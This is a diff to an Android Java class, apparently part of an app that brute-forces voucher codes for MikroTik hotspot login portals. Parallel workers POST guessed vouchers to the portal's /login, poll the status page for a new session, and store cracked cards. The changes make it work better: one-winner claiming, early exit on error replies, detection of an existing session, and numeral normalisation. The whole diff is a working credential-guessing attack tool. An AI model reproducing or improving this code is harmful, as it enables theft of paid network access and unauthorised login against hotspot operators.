@@ -11,7 +11,6 @@ import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
-import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
@@ -40,6 +39,8 @@ public class MikrotikFinder {
     private final GuessDatabase db;
 
     private final AtomicBoolean running = new AtomicBoolean(false);
+    private final AtomicBoolean claimed = new AtomicBoolean(false);
+    private final AtomicBoolean finishedOnce = new AtomicBoolean(false);
     private final AtomicLong totalAttempts = new AtomicLong(0);
     private volatile String currentVoucher;
     private volatile String foundVoucher;
@@ -53,7 +54,7 @@ public class MikrotikFinder {
                           String prefix, String middle, String suffix,
                           int varDigits, int maxAttempts, int waitMs, int parallel,
                           boolean relax, GuessDatabase db) {
-        this.rawUrl = cleanUrl(rawUrl);
+        this.rawUrl = cleanUrl(convertArabicNumerals(rawUrl));
         String calcBase;
         try {
             URL u = new URL(this.rawUrl);
@@ -82,6 +83,10 @@ public class MikrotikFinder {
         if (running.get()) return;
         this.listener = l;
         running.set(true);
+        claimed.set(false);
+        finishedOnce.set(false);
+        foundVoucher = null;
+        lastStatusJson = null;
         pool = Executors.newFixedThreadPool(parallel + 1);
         pool.submit(this::bootstrap);
     }
@@ -103,6 +108,23 @@ public class MikrotikFinder {
             fields.put("dst", base + "/");
             formTemplate = fields;
             Log.d("NEXORA", "form fields: " + fields.keySet());
+
+            String initJson = httpGet(base + STATUS_PATH, probe, 5000);
+            if (statusActive(initJson)) {
+                String u = getStr(initJson, "username");
+                if (u != null && !u.isEmpty() && !u.equals("-") && !u.equals("N/A")) {
+                    lastStatusJson = initJson;
+                    running.set(false);
+                    if (listener != null) {
+                        final String fv = u;
+                        final String fj = initJson;
+                        uiHandler.post(() -> listener.onCardFound(fv, fj));
+                        uiHandler.post(() -> listener.onFinished(true));
+                    }
+                    return;
+                }
+                Log.w("NEXORA", "active session but username hidden");
+            }
 
             emitProgress("بدء المحاولات...");
             for (int i = 0; i < parallel; i++) pool.submit(new Worker(i));
@@ -143,7 +165,7 @@ public class MikrotikFinder {
                     Thread.sleep(sleep);
                 } catch (InterruptedException e) { break; }
             }
-            if (listener != null) {
+            if (listener != null && finishedOnce.compareAndSet(false, true)) {
                 final boolean f = foundVoucher != null;
                 uiHandler.post(() -> listener.onFinished(f));
             }
@@ -159,10 +181,18 @@ public class MikrotikFinder {
         boolean beforeActive = statusActive(beforeJson);
 
         String body = buildFormBody(formTemplate, voucher);
-        httpPost(base + "/login", body, session, 6000);
+        String postResp = httpPost(base + "/login", body, session, 6000);
         totalAttempts.incrementAndGet();
 
-        long[] checks = {150, 200, 250, 300, 400, 500, 700, 900};
+        if (postResp != null) {
+            String lr = postResp.toLowerCase();
+            if (lr.contains("already authorizing") || lr.contains("invalid") ||
+                lr.contains("error") || lr.contains("wrong") || lr.contains("denied")) {
+                return false;
+            }
+        }
+
+        long[] checks = {150, 200, 250, 300, 400, 500};
         for (long d : checks) {
             try { Thread.sleep(d); } catch (InterruptedException e) { return false; }
             if (!running.get()) return false;
@@ -178,18 +208,19 @@ public class MikrotikFinder {
             if (user != null && !user.isEmpty() && !user.equals("-") && user.equals(voucher)) signal = true;
             if (nowActive && beforeUptime > 30 && nowUptime >= 0 && nowUptime <= FRESH_UPTIME_SECONDS) signal = true;
             if (nowActive && !beforeActive) signal = true;
+
             if (!signal) { emitProgress(""); continue; }
+            if (!claimed.compareAndSet(false, true)) return false;
 
             String realUser = readRealUsername(session);
+            String finalUser = voucher;
             if (realUser != null && !realUser.isEmpty() && !realUser.equals("-") && !realUser.equals("N/A")) {
-                user = realUser;
-            } else if (user == null || user.isEmpty() || user.equals("-")) {
-                user = voucher;
+                finalUser = realUser;
             }
 
             lastStatusJson = afterJson;
-            db.addFound(user, afterJson);
-            currentVoucher = user;
+            db.addFound(finalUser, afterJson);
+            currentVoucher = finalUser;
             return true;
         }
         return false;
@@ -211,24 +242,13 @@ public class MikrotikFinder {
     private String extractUsernameFromHtml(String html) {
         if (html == null) return null;
         try {
-            java.util.regex.Matcher m1 = java.util.regex.Pattern
-                .compile("\"username\"\\s*:\\s*\"([^\"]+)\"")
-                .matcher(html);
+            Matcher m1 = Pattern.compile("\"username\"\\s*:\\s*\"([^\"]+)\"").matcher(html);
             if (m1.find()) return m1.group(1);
-
-            java.util.regex.Matcher m2 = java.util.regex.Pattern
-                .compile("name=[\"']username[\"'][^>]*value=[\"']([^\"']+)[\"']")
-                .matcher(html);
+            Matcher m2 = Pattern.compile("name=[\"']username[\"'][^>]*value=[\"']([^\"']+)[\"']").matcher(html);
             if (m2.find()) return m2.group(1);
-
-            java.util.regex.Matcher m3 = java.util.regex.Pattern
-                .compile("<td[^>]*>\\s*[Uu]sername\\s*</td>\\s*<td[^>]*>\\s*([^<\\s]+)")
-                .matcher(html);
+            Matcher m3 = Pattern.compile("<td[^>]*>\\s*[Uu]sername\\s*</td>\\s*<td[^>]*>\\s*([^<\\s]+)").matcher(html);
             if (m3.find()) return m3.group(1);
-
-            java.util.regex.Matcher m4 = java.util.regex.Pattern
-                .compile("logged[ -]?in\\s+as\\s+[\"']?([A-Za-z0-9._-]+)")
-                .matcher(html);
+            Matcher m4 = Pattern.compile("logged[ -]?in\\s+as\\s+[\"']?([A-Za-z0-9._-]+)").matcher(html);
             if (m4.find()) return m4.group(1);
         } catch (Exception e) {}
         return null;
@@ -390,6 +410,16 @@ public class MikrotikFinder {
         return raw;
     }
 
+    private static String convertArabicNumerals(String s) {
+        if (s == null) return null;
+        StringBuilder sb = new StringBuilder();
+        for (char c : s.toCharArray()) {
+            if (c >= '\u0660' && c <= '\u0669') sb.append((char)('0' + (c - '\u0660')));
+            else sb.append(c);
+        }
+        return sb.toString();
+    }
+
     private static String sanitize(String s) {
         if (s == null) return "";
         s = s.trim();
@@ -449,17 +479,17 @@ public class MikrotikFinder {
             int code = c.getResponseCode();
             if (code < 200 || code >= 300) { c.disconnect(); return null; }
             StringBuilder sb = new StringBuilder();
-            java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(c.getInputStream(), "UTF-8"));
+            BufferedReader br = new BufferedReader(new InputStreamReader(c.getInputStream(), "UTF-8"));
             String line;
             while ((line = br.readLine()) != null) { sb.append(line); if (sb.length() > 20000) break; }
             br.close(); c.disconnect(); c = null;
             String s = sb.toString();
             try {
-                org.json.JSONObject o = new org.json.JSONObject(s);
+                JSONObject o = new JSONObject(s);
                 String u = o.optString("username", "").trim();
                 if (!u.isEmpty() && !u.equals("-") && !u.equals("N/A")) return u;
             } catch (Exception ignore) {}
-            java.util.regex.Matcher m = java.util.regex.Pattern.compile("\"username\"\\s*:\\s*\"([^\"]+)\"").matcher(s);
+            Matcher m = Pattern.compile("\"username\"\\s*:\\s*\"([^\"]+)\"").matcher(s);
             if (m.find()) return m.group(1);
             return null;
         } catch (Exception e) {
